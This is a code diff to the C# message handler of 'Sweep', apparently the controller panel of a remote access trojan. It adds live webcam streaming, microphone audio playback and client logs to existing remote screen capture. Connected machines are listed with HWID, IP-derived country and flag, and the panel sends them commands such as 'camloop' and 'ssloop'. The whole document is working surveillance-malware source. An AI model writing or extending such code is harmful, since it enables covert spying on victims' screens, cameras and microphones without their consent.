@@ -1,13 +1,16 @@
 ﻿using System;
 using System.Drawing;
 using System.IO;
+using System.Linq;
 using System.Threading.Tasks;
+using System.Windows.Forms;
 using BrightIdeasSoftware;
 using LazyServer;
 using Newtonsoft.Json.Linq;
 using Sweep.Forms;
 using Sweep.Models;
 using Sweep.UI;
+using NAudio.Wave;
 
 namespace Sweep.Services
 {
@@ -15,20 +18,28 @@ namespace Sweep.Services
     {
         private readonly LazyServerHost _server;
         private readonly ObjectListView _listView;
+        private readonly ObjectListView _logsview;
         private ScreenViewer viewer;
+        private WebcamViewer webcamViewer;
         private string previousid = string.Empty;
+        private Sweep.Forms.Sweep _sweepform;
 
-        public MessageHandler(LazyServerHost server, ObjectListView listView, int port)
+        // Audio playback components
+        private WaveOutEvent waveOut;
+        private BufferedWaveProvider bufferedProvider;
+
+        public MessageHandler(LazyServerHost server, ObjectListView listView, int port, ObjectListView logsview, Forms.Sweep th)
         {
             _server = server ?? throw new ArgumentNullException(nameof(server));
             _listView = listView ?? throw new ArgumentNullException(nameof(listView));
+            _logsview = logsview ?? throw new ArgumentNullException(nameof(logsview));
+            _sweepform = th ?? throw new ArgumentNullException(nameof(th));
 
-            // Configure the list-view columns once
             ListViewConfigurator.Configure(_listView, port);
 
-            // Subscribe to server events
             _server.MessageReceived += OnTextMessageReceived;
             _server.FileOfferWithMetaReceived += OnFileOfferWithMetaReceived;
+            _server.ClientDisconnected += OnClientDisconnected;
         }
 
         private void OnTextMessageReceived(object sender, MessageEventArgs e)
@@ -60,78 +71,178 @@ namespace Sweep.Services
                     await HandleScreenshotAsync(meta, e.ClientId, e.FileRequest.FileBytes);
                     break;
 
-                
+                case "log":
+                    AddLogToList(meta);
+                    break;
+
+                case "camframe":
+                    await HandleWebcamAsync(meta, e.ClientId, e.FileRequest.FileBytes);
+                    break;
+
+                case "micaudio":
+                    await HandleMicAudioAsync(meta, e.ClientId, e.FileRequest.FileBytes);
+                    break;
 
                 default:
                     Console.WriteLine($"[WARN] Unknown msg type '{msgType}' from {e.ClientId}");
                     break;
             }
         }
+
+        private void AddLogToList(JObject meta)
+        {
+            var log = new Log
+            {
+                Time = DateTime.Now.ToString("HH:mm:ss"),
+                Message = (string)meta["message"],
+                Type = (string)meta["type"]
+            };
+
+            if (_listView.InvokeRequired)
+            {
+                _logsview.Invoke(new Action(() => _logsview.AddObject(log)));
+            }
+            else
+            {
+                _logsview.AddObject(log);
+            }
+        }
+
+        private async Task HandleWebcamAsync(JObject meta, string clientId, byte[] packet)
+        {
+            if (webcamViewer == null || webcamViewer.IsDisposed || clientId != previousid)
+            {
+                var ctrl = _listView;
+
+                void ShowViewer()
+                {
+                    webcamViewer = new WebcamViewer();
+                    webcamViewer.Show();
+
+                    webcamViewer.QualityChanged += async (string quality) =>
+                    {
+                        await _server.SendMessageToClient(clientId, new JObject
+                        {
+                            ["command"] = "camloop",
+                            ["quality"] = quality
+                        }.ToString());
+                    };
+
+                    webcamViewer.Closing += async () =>
+                    {
+                        await _server.SendMessageToClient(clientId, new JObject
+                        {
+                            ["command"] = "stopcam"
+                        }.ToString());
+                    };
+
+                    webcamViewer.ScreenEvent += async (bool active) =>
+                    {
+                        await _server.SendMessageToClient(clientId, new JObject
+                        {
+                            ["command"] = active ? "camloop" : "stopcam"
+                        }.ToString());
+                    };
+
+                    webcamViewer.MonitorChanged += async (int index) =>
+                    {
+                        await _server.SendMessageToClient(clientId, new JObject
+                        {
+                            ["command"] = "cam",
+                            ["idx"] = index
+                        }.ToString());
+                    };
+                }
+
+                if (ctrl.InvokeRequired)
+                    ctrl.Invoke((Action)ShowViewer);
+                else
+                    ShowViewer();
+            }
+
+            previousid = clientId;
+            int camCount = (int?)meta["cameras"] ?? 1;
+            webcamViewer.SetMonitors(camCount);
+
+            try
+            {
+                using var ms = new MemoryStream(packet);
+                var frame = Image.FromStream(ms);
+                webcamViewer.SetScreen(frame);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error in HandleWebcamAsync: " + ex);
+            }
+        }
+
         private async Task HandleScreenshotAsync(JObject meta, string clientId, byte[] packet)
         {
             if (viewer == null || viewer.IsDisposed || clientId != previousid)
             {
-                System.Windows.Forms.Control ctrl = _listView; // any control created on the UI thread
-                if (ctrl.InvokeRequired)
-                {
-                    ctrl.Invoke(new Action(() =>
-                    {
-                        viewer = new ScreenViewer();
-                        viewer.Show();
-                        viewer.SetMonitors((int)meta["monitors"]);
-                    }));
-                }
-                else
+                var ctrl = _listView;
+
+                void ShowViewer()
                 {
                     viewer = new ScreenViewer();
                     viewer.Show();
+                    viewer.SetMonitors((int)meta["monitors"]);
+
+                    viewer.QualityChanged += async (string quality) =>
+                    {
+                        await _server.SendMessageToClient(clientId, new JObject
+                        {
+                            ["command"] = "ssloop",
+                            ["quality"] = quality
+                        }.ToString());
+                    };
+
+                    viewer.Closing += async () =>
+                    {
+                        await _server.SendMessageToClient(clientId, new JObject
+                        {
+                            ["command"] = "stopss"
+                        }.ToString());
+                    };
+
+                    viewer.ScreenEvent += async (bool active) =>
+                    {
+                        await _server.SendMessageToClient(clientId, new JObject
+                        {
+                            ["command"] = active ? "ssloop" : "stopss"
+                        }.ToString());
+                    };
+
+                    viewer.MonitorChanged += async (int index) =>
+                    {
+                        await _server.SendMessageToClient(clientId, new JObject
+                        {
+                            ["command"] = "mon",
+                            ["idx"] = index
+                        }.ToString());
+                    };
                 }
+
+                if (ctrl.InvokeRequired)
+                    ctrl.Invoke((Action)ShowViewer);
+                else
+                    ShowViewer();
             }
+
             previousid = clientId;
-
-            viewer.QualityChanged += async (string quality) => {
-                await _server.SendMessageToClient(clientId, new JObject {
-                    ["command"] = "ssloop",
-                    ["quality"] = quality
-                }.ToString());
-            };
-
-            viewer.Closing += async () => {
-                await _server.SendMessageToClient(clientId, new JObject
-                {
-                    ["command"] = "stopss"
-                }.ToString());
-            };
-
-            viewer.ScreenEvent += async (bool yoy) => {
-                await _server.SendMessageToClient(clientId, new JObject
-                {
-                    ["command"] = yoy ? "ssloop" : "stopss"
-                }.ToString());
-            };
-
-            viewer.MonitorChanged += async (int yoy) => {
-                await _server.SendMessageToClient(clientId, new JObject
-                {
-                    ["command"] = "mon",
-                    ["idx"] = yoy
-                }.ToString());
-            };
 
             try
             {
-                Image shot;
-                using (var ms = new MemoryStream(packet))
-                    shot = Image.FromStream(ms);
-
-                viewer.SetScreen(shot);
-                
+                using var ms = new MemoryStream(packet);
+                var image = Image.FromStream(ms);
+                viewer.SetScreen(image);
             }
             catch (Exception ex)
             {
-                Console.WriteLine("Error in HandleScreenshot: " + ex);
+                Console.WriteLine("Error in HandleScreenshotAsync: " + ex);
             }
         }
+
         private async Task HandleAliveAsync(JObject meta, string clientId, byte[] packet)
         {
             try
@@ -140,9 +251,8 @@ namespace Sweep.Services
                 var flag = await FlagDownloader.GetFlagImageByIpAsync(ip);
                 var country = await FlagDownloader.GetCountryAsync(ip);
 
-                Image screen;
-                using (var ms = new MemoryStream(packet))
-                    screen = Image.FromStream(ms);
+                using var ms = new MemoryStream(packet);
+                var screen = Image.FromStream(ms);
 
                 var client = new ClientInfo
                 {
@@ -159,7 +269,6 @@ namespace Sweep.Services
                     HWID = (string)meta["hwid"],
                 };
 
-                // Safe UI thread marshal
                 if (_listView.InvokeRequired)
                     _listView.BeginInvoke(new Action(() => _listView.AddObject(client)));
                 else
@@ -167,10 +276,64 @@ namespace Sweep.Services
             }
             catch (Exception ex)
             {
-                Console.WriteLine("Error in HandleAlive: " + ex);
+                Console.WriteLine("Error in HandleAliveAsync: " + ex);
+            }
+        }
+
+        private async Task HandleMicAudioAsync(JObject meta, string clientId, byte[] audioBytes)
+        {
+            try
+            {
+                if (waveOut == null || bufferedProvider == null)
+                {
+                    var waveFormat = new WaveFormat(8000, 1); // 8 kHz, mono to match client
+
+                    bufferedProvider = new BufferedWaveProvider(waveFormat)
+                    {
+                        DiscardOnBufferOverflow = true,
+                        BufferLength = 1024 * 100
+                    };
+
+                    waveOut = new WaveOutEvent();
+                    waveOut.Init(bufferedProvider);
+                    waveOut.Play();
+                }
+
+                bufferedProvider.AddSamples(audioBytes, 0, audioBytes.Length);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error playing mic audio: " + ex);
             }
         }
 
 
+        private void OnClientDisconnected(object sender, string clientId)
+        {
+            if (_listView.InvokeRequired)
+            {
+                _listView.Invoke(new Action(() => RemoveClientById(clientId)));
+            }
+            else
+            {
+                RemoveClientById(clientId);
+            }
+
+            // Clean up audio playback
+            waveOut?.Stop();
+            waveOut?.Dispose();
+            waveOut = null;
+            bufferedProvider = null;
+        }
+
+        private void RemoveClientById(string clientId)
+        {
+            var obj = _listView.Objects.Cast<ClientInfo>().FirstOrDefault(c => c.ID == clientId);
+            if (obj != null)
+            {
+                _listView.RemoveObject(obj);
+                Console.WriteLine($"Client disconnected and removed: {clientId}");
+            }
+        }
     }
 }
